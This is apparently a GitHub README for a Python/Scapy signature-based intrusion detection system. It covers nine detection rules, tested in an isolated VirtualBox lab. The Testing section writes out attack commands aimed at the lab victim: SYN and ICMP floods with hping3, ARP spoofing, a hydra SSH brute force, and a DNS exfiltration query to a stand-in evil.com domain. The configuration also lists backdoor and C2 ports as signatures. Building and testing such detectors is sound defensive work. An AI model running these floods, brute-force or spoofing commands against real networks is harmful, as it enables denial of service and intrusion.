# 🛡️ Python Intrusion Detection System (IDS)

> A signature-based network intrusion detection system built from scratch in Python using Scapy. Monitors live network traffic in real time, detects nine categories of attack behavior across five OSI layers, and logs all alerts to a structured forensic record.

![Python](https://img.shields.io/badge/Python-3.x-blue?style=flat-square&logo=python)
![Scapy](https://img.shields.io/badge/Scapy-2.x-green?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Linux-orange?style=flat-square&logo=linux)
![Rules](https://img.shields.io/badge/Detection%20Rules-9-red?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-lightgrey?style=flat-square)
![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square)

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Detection Rules](#detection-rules)
- [Lab Environment](#lab-environment)
- [Installation](#installation)
- [Usage](#usage)
- [Sample Output](#sample-output)
- [Project Structure](#project-structure)
- [Testing](#testing)
- [Concepts Demonstrated](#concepts-demonstrated)
- [Roadmap](#roadmap)

---

## Overview

This project is a hands-on implementation of a **signature-based Intrusion Detection System** — the same fundamental architecture used in commercial tools like Snort and Suricata. It was built as a portfolio project to develop real-world skills in network security, packet analysis, and threat detection.

The IDS captures live packets off a network interface using Scapy, passes each packet through a rules engine of detection functions, and fires timestamped alerts to both the console and a persistent log file when suspicious activity is detected.

**Built and tested in an isolated 2-VM VirtualBox lab** — a Kali Linux attacker machine and an Ubuntu victim/IDS machine — using real attack tools to verify every detection rule.

---

## Features

- ✅ **Real-time packet capture** using Scapy's `sniff()` function
- ✅ **Nine detection rules** covering reconnaissance, DoS, credential theft, C2, brute force, and ARP spoofing
- ✅ **Five OSI layers monitored** — L2 (ARP), L3 (IP/ICMP), L4 (TCP/UDP), L7 (DNS/FTP)
- ✅ **Dual output** — console alerts for live monitoring + persistent log file for forensics
- ✅ **Structured timestamped logging** — SIEM-ready alert format
- ✅ **Configurable thresholds** — easily tune sensitivity for your environment
- ✅ **IP whitelist / blacklist** — skip trusted IPs, instantly flag known-bad actors
- ✅ **ARP table tracking** — maintains IP→MAC mappings to detect spoofing attempts
- ✅ **Service labeling** — port numbers translated to human-readable service names
- ✅ **DNS decoding** — reads and displays actual domain names from DNS queries
- ✅ **TCP flag analysis** — interprets SYN, ACK, FIN, RST, PSH in real time
- ✅ **Payload inspection** — deep packet content analysis for credential detection

---

## Detection Rules

| # | Rule | Detection Method | Attack Category | Tested With | Version |
|---|------|-----------------|-----------------|-------------|---------|
| 1 | **IP Blacklist** | Source IP matched against known-bad list | Threat Intelligence | `ping` | v2.0 |
| 2 | **Port Scan** | Unique destination ports per source IP exceeds threshold | Reconnaissance | `nmap -sS` | v1.0 |
| 3 | **SYN Flood** | SYN packet volume per source IP exceeds threshold | Denial of Service | `hping3 --flood` | v1.1 |
| 4 | **Suspicious Ports** | Destination port matched against attack tool signature list | Backdoor / C2 | `netcat -zv` | v2.0 |
| 5 | **Cleartext Credentials** | FTP/Telnet payload inspected for USER/PASS keywords | Credential Theft | FTP client | v2.0 |
| 6 | **DNS Exfiltration** | DNS query domain name length exceeds threshold | Data Exfiltration / C2 | `nslookup` | v2.0 |
| 7 | **ARP Spoofing** | ARP reply MAC conflicts or null MACs flagged | Man-in-the-Middle | `arpspoof` | v3.0 |
| 8 | **Brute Force** | High SYN volume to single auth port (SSH/RDP/FTP) | Initial Access | `hydra` | v3.0 |
| 9 | **ICMP Flood** | ICMP packet volume per source IP exceeds threshold | Denial of Service | `hping3 --icmp` | v3.0 |

### Detection Logic Overview

```
Port Scan    — tracks unique ports per IP using a defaultdict(set)
SYN Flood    — counts SYN volume per IP using a defaultdict(int)
Blacklist    — O(1) set lookup on every packet, fires before all other rules
Susp. Ports  — destination port matched against SUSPICIOUS_PORTS dictionary
Cleartext    — payload decoded and scanned for credential keywords
DNS Exfil    — domain name length checked against configurable threshold
ARP Spoofing — maintains IP→MAC table, flags conflicts and null MACs
Brute Force  — tracks SYN count per src_ip:dst_port key — one port, high volume
ICMP Flood   — counts ICMP packets per source IP using a defaultdict(int)
```

> **Architecture note:** ARP packets have no IP layer and are handled at the very top of `packet_callback()` before the IP filter — otherwise they would be silently discarded.

---

## Lab Environment

```
┌─────────────────────────┐         ┌─────────────────────────┐
│   Kali Linux 2025.4     │         │   Ubuntu 24.04 LTS      │
│   192.168.56.101        │◄───────►│   192.168.56.102        │
│                         │         │                         │
│   ATTACKER VM           │         │   VICTIM / IDS VM       │
│   ─────────────         │         │   ──────────────        │
│   Nmap                  │         │   Python IDS (Scapy)    │
│   hping3                │         │   ids_alerts.log        │
│   hping3 --icmp         │         │   enp0s8 interface      │
│   netcat                │         │                         │
│   FTP client            │         │                         │
│   arpspoof              │         │                         │
│   Hydra                 │         │                         │
└─────────────────────────┘         └─────────────────────────┘
         │                                      │
         └──────────── VirtualBox ──────────────┘
                  Host-Only Network
                  192.168.56.0/24
                  (Isolated — no internet exposure)
```

Both VMs share a **Host-Only** VirtualBox network — completely isolated from the real internet. All attack traffic stays contained inside the lab environment.

---

## Installation

### Prerequisites

- Python 3.x
- Linux (Ubuntu recommended) or macOS
- Root / sudo privileges (required for packet capture)

### Setup

```bash
# Clone the repository
git clone https://github.com/ZeroDavo/python-ids.git
cd python-ids

# Create a virtual environment
python3 -m venv ids-env

# Activate it
source ids-env/bin/activate

# Install dependencies
pip install scapy
```

### Find Your Network Interface

```bash
ip addr
```

Look for your monitoring interface (e.g., `enp0s8`, `eth0`, `wlan0`). Update the `iface` parameter in the script to match:

```python
sniff(prn=packet_callback, store=False, iface="enp0s8")
```

---

## Usage

### Start the IDS

```bash
sudo ~/ids-env/bin/python3 packet_sniffer.py
```

### Expected Startup Banner

```
============================================================
  INTRUSION DETECTION SYSTEM v3.0
  Started: 2026-04-29 12:09:38
  Monitoring: enp0s8 (Host-Only Lab Network)
  Port scan threshold : 5 unique ports
  SYN flood threshold : 100 packets
  Suspicious ports    : 6 monitored
  Blacklisted IPs     : 0 entries
  ICMP flood threshold: 50 packets
  Brute force threshold: 10 SYNs to one port
  Alerts logged to    : ids_alerts.log
============================================================
```

### Stop the IDS

```
Ctrl + C
```

### Configuration

All thresholds and lists are defined at the top of `packet_sniffer.py`:

```python
# ─── Detection thresholds ────────────────────────────────────────
PORT_SCAN_THRESHOLD   = 5    # Unique ports before alerting
SYN_FLOOD_THRESHOLD   = 100  # SYN packet volume before alerting
DNS_EXFIL_THRESHOLD   = 50   # Domain name length before alerting
ICMP_FLOOD_THRESHOLD  = 50   # ICMP packets before alerting
BRUTE_FORCE_THRESHOLD = 10   # SYN packets to same port before alerting

# ─── Suspicious ports ────────────────────────────────────────────
SUSPICIOUS_PORTS = {
    4444:  "Metasploit default listener",
    1337:  "Common backdoor port",
    31337: "Elite hacker port",
    6667:  "IRC — common C2 channel",
    5555:  "Android ADB / common backdoor",
    9001:  "Tor commonly uses this port",
}

# ─── IP Blacklist / Whitelist ─────────────────────────────────────
BLACKLIST = {
    # "10.0.0.99",   # Add known-bad IPs here
}

WHITELIST = {
    "192.168.56.1",   # VirtualBox host gateway
    "127.0.0.1",      # Localhost
}
```

---

## Sample Output

### Live Console — Port Scan Detected

```
[2026-04-27 14:02:14] TCP | 192.168.56.101:58045 --> 192.168.56.102:3389 | Service: RDP | Flags: S
[2026-04-27 14:02:14] TCP | 192.168.56.101:58045 --> 192.168.56.102:445  | Service: SMB | Flags: S
[2026-04-27 14:02:14] TCP | 192.168.56.101:58045 --> 192.168.56.102:22   | Service: SSH | Flags: S
[2026-04-27 14:02:14] TCP | 192.168.56.101:58045 --> 192.168.56.102:80   | Service: HTTP | Flags: S
[2026-04-27 14:02:14] TCP | 192.168.56.101:58045 --> 192.168.56.102:4444 | Service: ⚠ Metasploit | Flags: S

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  [ALERT] PORT SCAN DETECTED
  Time  : 2026-04-27 14:02:14
  Detail: Source: 192.168.56.101 | Unique ports probed: 5
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

### Live Console — Cleartext Credentials Detected

```
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  [ALERT] CLEARTEXT CREDENTIALS DETECTED
  Time  : 2026-04-28 15:05:37
  Detail: Source: 192.168.56.101 | Port: 21 | Data: USER testuser
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  [ALERT] CLEARTEXT CREDENTIALS DETECTED
  Time  : 2026-04-28 15:05:44
  Detail: Source: 192.168.56.101 | Port: 21 | Data: PASS testpass
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

### Live Console — Brute Force Detected

```
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  [ALERT] BRUTE FORCE ATTEMPT DETECTED
  Time  : 2026-04-29 15:41:17
  Detail: Source: 192.168.56.101 | Target: SSH (port 22) | SYN count: 10
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

### Live Console — ARP Spoofing Detected

```
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  [ALERT] ARP SPOOFING DETECTED
  Time  : 2026-04-29 20:33:00
  Detail: IP 192.168.56.1 | Null/spoofed MAC detected — possible ARP poisoning attempt
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

### Log File — ids_alerts.log

```
[2026-04-28 12:22:01] ALERT | BLACKLISTED IP DETECTED         | Source: 192.168.56.101 | All traffic from this IP is flagged
[2026-04-28 14:02:14] ALERT | PORT SCAN DETECTED              | Source: 192.168.56.101 | Unique ports probed: 5
[2026-04-28 18:03:33] ALERT | SYN FLOOD DETECTED              | Source: 192.168.56.101 | SYN packets sent: 100
[2026-04-28 12:23:51] ALERT | SUSPICIOUS PORT DETECTED        | Source: 192.168.56.101 --> 192.168.56.102:1337 | Reason: Common backdoor port
[2026-04-28 15:05:37] ALERT | CLEARTEXT CREDENTIALS DETECTED  | Source: 192.168.56.101 | Port: 21 | Data: USER testuser
[2026-04-28 15:22:24] ALERT | POSSIBLE DNS EXFILTRATION       | Source: 192.168.56.101 | Query length: 52 chars | Domain: aGVsbG8...evil.com.
[2026-04-29 20:33:00] ALERT | ARP SPOOFING DETECTED           | IP 192.168.56.1 | Null/spoofed MAC detected
[2026-04-29 15:41:17] ALERT | BRUTE FORCE ATTEMPT DETECTED    | Source: 192.168.56.101 | Target: SSH (port 22) | SYN count: 10
[2026-04-29 12:XX:XX] ALERT | ICMP FLOOD DETECTED             | Source: 192.168.56.101 | ICMP packets sent: 50
```

---

## Project Structure

```
python-ids/
│
├── packet_sniffer.py      # Main IDS script — all detection logic
├── ids_alerts.log         # Generated at runtime — forensic alert record
└── README.md              # This file
```

---

## Testing

Each rule was verified against a real attack tool in the isolated lab environment. All tests were run from the Kali Linux attacker VM targeting the Ubuntu victim VM.

### Run All Tests

| Rule | Test Command (run from Kali) | Expected Alert |
|------|------------------------------|----------------|
| Blacklist | `ping -c 3 192.168.56.102` (add Kali IP to BLACKLIST first) | `BLACKLISTED IP DETECTED` |
| Port Scan | `sudo nmap -sS 192.168.56.102` | `PORT SCAN DETECTED` |
| SYN Flood | `sudo hping3 -S --flood -p 80 192.168.56.102` | `SYN FLOOD DETECTED` |
| Suspicious Port | `nc -zv 192.168.56.102 1337` | `SUSPICIOUS PORT DETECTED` |
| Cleartext Creds | `ftp 192.168.56.102` then login | `CLEARTEXT CREDENTIALS DETECTED` |
| DNS Exfiltration | `nslookup aGVsbG8td29ybGQtdGhpcy1pcy1zdG9sZW4tZGF0YQ.evil.com 192.168.56.102` | `POSSIBLE DNS EXFILTRATION` |
| ARP Spoofing | `sudo arpspoof -i eth1 -t 192.168.56.102 192.168.56.1` | `ARP SPOOFING DETECTED` |
| Brute Force | `sudo hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.56.102` | `BRUTE FORCE ATTEMPT DETECTED` |
| ICMP Flood | `sudo hping3 --icmp --flood 192.168.56.102` | `ICMP FLOOD DETECTED` |

> **Note:** Add the Kali IP (`192.168.56.101`) to the BLACKLIST before running the blacklist test. Remove after.

> **Note:** For DNS exfiltration, specifying `192.168.56.102` as the DNS server forces the query through the Host-Only interface.

> **Note:** For Hydra, unzip the wordlist first: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

> **Note:** ARP spoofing test — VirtualBox Host-Only networks rewrite spoofed MACs to `00:00:00:00:00:00`. The IDS detects this null MAC as a spoofing indicator. On a physical network, the MAC conflict path would fire instead.

### Verify the Log File

```bash
# View all alerts
cat ids_alerts.log

# Filter by alert type
cat ids_alerts.log | grep "PORT SCAN"
cat ids_alerts.log | grep "SYN FLOOD"
cat ids_alerts.log | grep "CLEARTEXT"
cat ids_alerts.log | grep "DNS EXFIL"
cat ids_alerts.log | grep "ARP SPOOF"
cat ids_alerts.log | grep "BRUTE FORCE"
cat ids_alerts.log | grep "ICMP FLOOD"

# Count total alerts
cat ids_alerts.log | wc -l
```

---

## Concepts Demonstrated

| Concept | Implementation |
|---------|---------------|
| OSI Model | Packet analysis across L2 (ARP/MAC), L3 (IP/ICMP), L4 (TCP/UDP), L7 (DNS/FTP) |
| TCP 3-Way Handshake | Live capture and flag interpretation (SYN → SYN-ACK → ACK) |
| Stateful Detection | Tracking behavior across multiple packets using defaultdict trackers |
| Payload Inspection | Decoding FTP/Telnet TCP payloads to extract credential keywords |
| Signature-Based IDS | Rules engine matching traffic against known attack patterns |
| DNS Covert Channels | Detecting C2 communication via DNS query length anomalies |
| ARP Protocol | Layer 2 address resolution monitoring and MAC conflict detection |
| Brute Force Detection | Distinguishing credential attacks from port scans via single-port SYN volume |
| Log Management | Structured timestamped forensic records — SIEM-ingestible format |
| False Positive Reduction | Threshold tuning, whitelisting, and precise rule conditions |
| Virtual Lab Design | Isolated Host-Only network for safe attack/defend simulation |
| Hypervisor Behavior | Discovered and documented VirtualBox MAC rewriting during ARP spoofing tests |

---

## Roadmap

- [x] ~~ARP spoofing detection~~ ✅ Completed in v3.0
- [x] ~~Brute force detection~~ ✅ Completed in v3.0
- [x] ~~ICMP flood detection~~ ✅ Completed in v3.0
- [ ] Time-window based counters — reset trackers every N seconds for ongoing detection
- [ ] Email / Slack alerting — real-time notifications on critical alerts
- [ ] External blacklist loading — ingest threat intel feeds from file on startup
- [x] ~~Wazuh SIEM integration~~ ✅ Completed — alerts flow from IDS → Wazuh agent → dashboard in real time

---

## ⚠️ Legal Disclaimer

This tool is intended for **educational purposes and authorized security testing only**. Only run packet capture tools on networks you own or have explicit written permission to monitor. Unauthorized network monitoring may violate local, state, and federal laws.

---

## Author

**ZeroDavo**
- GitHub: [@ZeroDavo](https://github.com/ZeroDavo)

---

*Nine detection rules. Nine verified.*
